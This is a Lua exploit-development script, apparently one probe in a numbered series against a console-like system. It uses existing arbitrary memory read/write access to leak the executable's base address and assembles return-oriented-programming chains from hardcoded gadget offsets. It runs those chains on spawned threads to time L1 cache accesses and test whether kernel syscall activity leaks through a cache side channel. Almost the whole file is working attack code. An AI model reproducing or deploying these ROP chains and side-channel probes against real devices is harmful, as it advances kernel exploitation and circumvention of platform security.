-- CRASH_CLASS: MODERATE
-- PROBE 1199n: Kernel syscall cache footprint measurement
--
-- 1199m confirmed: ROP timer distinguishes hot(5 ticks) vs cold(20+ ticks).
-- This probe: does a syscall from child thread change cache state?
--   Group A: prime → 2 NOPs → probe (warm baseline)
--   Group B: prime → getpid → probe (1 syscall)
--   Group C: prime → 10×getpid → probe (heavy syscall)
--   Group D: prime → NOP → probe at 8 DIFFERENT L1 sets
--   Group E: prime → getpid → probe at 8 DIFFERENT L1 sets
-- If B/C probe delta > A, kernel execution is observable via cache.

print("=== PROBE 1199n: Kernel cache footprint ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax     = eb + 0x992
local g_pop_rdi     = eb + 0xC9DFE
local g_pop_rsi     = eb + 0xD77D
local g_bare_ret    = eb + 0x42
local g_mov_m_rax   = eb + 0x92C67
local g_mov_rax_mem = eb + 0x1EEBB

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_mmap = mk(477)

-- Shared results: 64 before/after pairs (128 qwords)
local shared = memory.alloc(0x800)
local sha = N(shared)
for i = 0, 0x7FC, 4 do wd(sha + i, 0) end

local counter_a = sha
local done_ctr  = sha + 0x10
local done_meas = sha + 0x18
local before_base = sha + 0x40    -- before[i] at +0x40 + i*8
local after_base  = sha + 0x240   -- after[i] at +0x240 + i*8

-- Probe page: 16KB mmap, use offsets 0x00, 0x40, 0x80, ... for different L1 sets
-- L1 set = (addr >> 6) mod 64, so offset 0x40 apart = 1 set apart
local probe_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(probe_page) >= 0xFFFF0000 then print("FATAL: probe mmap"); return end
local probe_a = N(probe_page)
-- Write known values at each probe offset
for s = 0, 7 do
    wq(probe_a + s * 0x40, uint64(0xAAAA0000 + s))
end
print(string.format("probe_page=0x%X  L1 sets: 8 (stride=0x40)", probe_a))

-- =============================================
-- COUNTER CHAIN: 200K ticks
-- =============================================
local TICKS = 200000
local ctr_buf = sc_mmap(uint64(0), uint64(0x800000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(ctr_buf) >= 0xFFFF0000 then print("FATAL: ctr mmap"); return end
local ctr_base = N(ctr_buf)
local ss_c = 0x1000
local rsp_c = ctr_base + ss_c - ((ctr_base + ss_c) % 16) - 8

local off = 0
local function ec(v) wq(rsp_c + off, v); off = off + 8 end

ec(g_pop_rdi); ec(uint64(129))
ec(g_pop_rsi); ec(uint64(N(fs_ptr)))
ec(g_pop_rax); ec(uint64(165))
ec(stub)
ec(g_pop_rdi); ec(uint64(counter_a))
for i = 1, TICKS do
    ec(g_pop_rax); ec(uint64(i))
    ec(g_mov_m_rax)
end
ec(g_pop_rdi); ec(uint64(done_ctr))
ec(g_pop_rax); ec(uint64(0xCAFE))
ec(g_mov_m_rax)
ec(g_pop_rdi); ec(uint64(0))
ec(g_pop_rax); ec(uint64(431))
ec(stub)
print(string.format("counter: %d ticks", TICKS))

-- =============================================
-- MEASUREMENT CHAIN
-- =============================================
-- Measurement layout:
--   [0..3]  Group A: prime → 2 NOPs → probe (probe_a+0x00)
--   [4..7]  Group B: prime → getpid → probe (probe_a+0x00)
--   [8..11] Group C: prime → 10×getpid → probe (probe_a+0x00)
--   [12..19] Group D: prime → NOP → probe (8 different L1 sets)
--   [20..27] Group E: prime → getpid → probe (8 different L1 sets)

local meas_buf = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if get_hi_lo(meas_buf) >= 0xFFFF0000 then print("FATAL: meas mmap"); return end
local meas_base = N(meas_buf)
local ss_m = 0x1000
local rsp_m = meas_base + ss_m - ((meas_base + ss_m) % 16) - 8

local off_m = 0
local function em(v) wq(rsp_m + off_m, v); off_m = off_m + 8 end

-- sysarch
em(g_pop_rdi); em(uint64(129))
em(g_pop_rsi); em(uint64(N(fs_ptr)))
em(g_pop_rax); em(uint64(165))
em(stub)

-- Helper: emit prime (read addr into cache)
local function emit_prime(addr)
    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)
end

-- Helper: emit timed probe (read counter, read addr, read counter → store before[i], after[i])
local function emit_probe(addr, idx)
    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(before_base + idx * 8))
    em(g_mov_m_rax)

    em(g_pop_rax); em(uint64(addr))
    em(g_mov_rax_mem)

    em(g_pop_rax); em(uint64(counter_a))
    em(g_mov_rax_mem)
    em(g_pop_rdi); em(uint64(after_base + idx * 8))
    em(g_mov_m_rax)
end

-- Helper: emit getpid syscall
local function emit_getpid()
    em(g_pop_rax); em(uint64(20))
    em(stub)
end

-- Helper: emit NOP (same # gadgets as getpid: 3 qwords)
local function emit_nop3()
    em(g_pop_rax); em(uint64(0))
    em(g_bare_ret)
end

-- === GROUP A: prime → NOP → probe (baseline, same address ×4) ===
for i = 0, 3 do
    emit_prime(probe_a)
    emit_nop3()
    emit_probe(probe_a, i)
end

-- === GROUP B: prime → getpid → probe (1 syscall ×4) ===
for i = 0, 3 do
    emit_prime(probe_a)
    emit_getpid()
    emit_probe(probe_a, 4 + i)
end

-- === GROUP C: prime → 10×getpid → probe (heavy ×4) ===
for i = 0, 3 do
    emit_prime(probe_a)
    for g = 1, 10 do emit_getpid() end
    emit_probe(probe_a, 8 + i)
end

-- === GROUP D: NOP → probe at 8 different L1 sets ===
for s = 0, 7 do
    emit_prime(probe_a + s * 0x40)
    emit_nop3()
    emit_probe(probe_a + s * 0x40, 12 + s)
end

-- === GROUP E: getpid → probe at 8 different L1 sets ===
for s = 0, 7 do
    emit_prime(probe_a + s * 0x40)
    emit_getpid()
    emit_probe(probe_a + s * 0x40, 20 + s)
end

-- done
em(g_pop_rdi); em(uint64(done_meas))
em(g_pop_rax); em(uint64(0xBEEF))
em(g_mov_m_rax)
em(g_pop_rdi); em(uint64(0))
em(g_pop_rax); em(uint64(431))
em(stub)

print(string.format("measurement: 28 samples, %d bytes", off_m))

-- =============================================
-- LAUNCH
-- =============================================
print("")

local par_c = memory.alloc(0x40)
local pc_ = N(par_c)
for i = 0, 0x3C, 4 do wd(pc_ + i, 0) end
wq(pc_, g_bare_ret)
wq(pc_ + 0x10, uint64(ctr_base))
wq(pc_ + 0x18, uint64(ss_c))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(pc_ + 0x30, tid_c)

print("launching counter...")
pcall(function() mk(455)(uint64(pc_), uint64(0x38)) end)

local gate = 0
for p = 1, 50000 do
    local v = rd(counter_a) or 0
    if v > 0 then gate = v; break end
end
print(string.format("gate: counter=%d", gate))
if gate == 0 then print("ABORT"); return end

local par_m = memory.alloc(0x40)
local pm = N(par_m)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
wq(pm, g_bare_ret)
wq(pm + 0x10, uint64(meas_base))
wq(pm + 0x18, uint64(ss_m))
local tid_m = memory.alloc(8); wq(N(tid_m), uint64(0))
wq(pm + 0x30, tid_m)

print("launching measurement...")
pcall(function() mk(455)(uint64(pm), uint64(0x38)) end)

for w = 1, 100000 do local _ = rd(sha + 0x50) end

if not alive() then print("DEAD"); return end

local dm = rd(done_meas) or 0
print(string.format("done_meas=0x%X", dm))

-- =============================================
-- RESULTS
-- =============================================
print("")

local function read_delta(idx)
    local b = rq(before_base + idx * 8)
    local a = rq(after_base + idx * 8)
    local bh, bl = get_hi_lo(b)
    local ah, al = get_hi_lo(a)
    return al - bl, bl, al
end

print("[A] Warm baseline (NOP, same addr ×4):")
local sum_a = 0
for i = 0, 3 do
    local d, b, a = read_delta(i)
    sum_a = sum_a + d
    print(string.format("  [%d] delta=%2d  (b=%d a=%d)", i, d, b, a))
end
local avg_a = sum_a / 4

print("")
print("[B] After 1× getpid (same addr ×4):")
local sum_b = 0
for i = 0, 3 do
    local d, b, a = read_delta(4 + i)
    sum_b = sum_b + d
    print(string.format("  [%d] delta=%2d  (b=%d a=%d)", i, d, b, a))
end
local avg_b = sum_b / 4

print("")
print("[C] After 10× getpid (same addr ×4):")
local sum_c = 0
for i = 0, 3 do
    local d, b, a = read_delta(8 + i)
    sum_c = sum_c + d
    print(string.format("  [%d] delta=%2d  (b=%d a=%d)", i, d, b, a))
end
local avg_c = sum_c / 4

print("")
print("[D] NOP, 8 L1 sets:")
local d_vals = {}
for s = 0, 7 do
    local d = read_delta(12 + s)
    table.insert(d_vals, d)
    print(string.format("  set[%d] delta=%2d", s, d))
end

print("")
print("[E] getpid, 8 L1 sets:")
local e_vals = {}
local evicted = 0
for s = 0, 7 do
    local d = read_delta(20 + s)
    table.insert(e_vals, d)
    local tag = ""
    if d > (d_vals[s + 1] or 0) + 3 then tag = " <-- EVICTED?"; evicted = evicted + 1 end
    print(string.format("  set[%d] delta=%2d%s", s, d, tag))
end

-- =============================================
-- ANALYSIS
-- =============================================
print("")
print("[SUMMARY]")
print(string.format("  A (NOP baseline):     avg=%.1f ticks", avg_a))
print(string.format("  B (1× getpid):        avg=%.1f ticks", avg_b))
print(string.format("  C (10× getpid):       avg=%.1f ticks", avg_c))
print(string.format("  D→E evictions:        %d/8 L1 sets", evicted))

if avg_b > avg_a + 2 or avg_c > avg_a + 2 then
    print("")
    print("** KERNEL CACHE FOOTPRINT DETECTED **")
    print(string.format("  syscall adds ~%.1f ticks (%.0f ns) to probe delta",
        avg_b - avg_a, (avg_b - avg_a) * 5.6))
    if avg_c > avg_b + 2 then
        print(string.format("  10× getpid adds more: %.1f ticks (cumulative kernel work)",
            avg_c - avg_b))
    end
elseif evicted > 0 then
    print("")
    print("** EVICTIONS FOUND in specific L1 sets **")
    print("  Same-address test was in a non-conflicting set")
else
    print("")
    print("** NO DETECTABLE FOOTPRINT — kernel cache footprint below noise floor **")
    print("  Possible: getpid is too lightweight, or L1 sets don't conflict")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 1199n COMPLETE ===")
